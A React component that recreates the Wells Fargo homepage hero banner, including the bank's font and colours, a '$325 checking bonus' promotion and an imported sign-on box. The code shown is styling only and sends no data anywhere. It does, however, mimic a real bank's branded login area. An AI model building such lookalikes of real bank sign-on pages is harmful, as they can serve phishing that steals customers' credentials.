import SignOnBox from './SignOnBox';

export default function HeroBanner() {
  return (
    <div className="relative w-full" style={{ backgroundColor: '#f9f7f6', minHeight: '650px' }}>
      <div className="max-w-[1400px] mx-auto relative" style={{ padding: '0 20px', minHeight: '650px' }}>
        {/* Sign-On Box - absolute positioned on left */}
        <div className="absolute z-10" style={{ top: '48px', left: '48px' }}>
          <SignOnBox />
        </div>

        {/* Hero text content - center area */}
        <div
          className="absolute"
          style={{
            left: '430px',
            paddingTop: '80px',
            width: '520px',
            textAlign: 'left',
          }}
        >
          <h2
            style={{
              fontFamily: '"Wells Fargo Sans", Arial, Helvetica, sans-serif',
              fontSize: '3.29411765rem',
              lineHeight: '1.107',
              color: '#141414',
              margin: '0 0 20px',
              fontWeight: 400,
            }}
          >
            $325 checking bonus on us
          </h2>
          <p
            style={{
              fontFamily: '"Wells Fargo Sans", Arial, Helvetica, sans-serif',
              fontSize: '1.29411765rem',
              lineHeight: '1.3',
              color: '#141414',
              margin: '0 0 4px',
            }}
          >
            New customers open an eligible checking account with qualifying direct deposits
          </p>
          <div style={{ padding: '24px 0' }}>
            <a
              href="#"
              className="inline-flex items-center justify-center hover:underline"
              style={{
                backgroundColor: '#fff',
                border: '1px solid #3b3331',
                color: '#3b3331',
                borderRadius: '24px',
                fontFamily: '"Wells Fargo Sans", Arial, Helvetica, sans-serif',
                fontWeight: 600,
                fontSize: '1rem',
                lineHeight: '1.29',
                padding: '9px 24px',
                minWidth: '174px',
                textAlign: 'center',
                textDecoration: 'none',
              }}
            >
              Get started &gt;&gt;
            </a>
          </div>
        </div>

        {/* Right side promo graphic */}
        <div
          className="absolute flex items-center justify-center"
          style={{ right: '80px', top: '80px', width: '280px', height: '380px' }}
        >
          <div className="text-center">
            <div style={{
              width: '180px', height: '3px', backgroundColor: '#C11574', margin: '0 auto 16px',
            }} />
            <div style={{
              fontFamily: '"Wells Fargo Sans", Arial, Helvetica, sans-serif', fontSize: '1.5rem', color: '#C11574',
              fontWeight: 400, marginBottom: '4px',
            }}>
              Enjoy
            </div>
            <div style={{
              fontFamily: '"Wells Fargo Sans", Arial, Helvetica, sans-serif',
              fontSize: '6rem', color: '#C11574', fontWeight: 300, lineHeight: '1',
              marginBottom: '16px',
            }}>
              $325
            </div>
            <div style={{
              width: '180px', height: '3px', backgroundColor: '#C11574', margin: '0 auto',
            }} />
          </div>
        </div>
      </div>
    </div>
  );
}
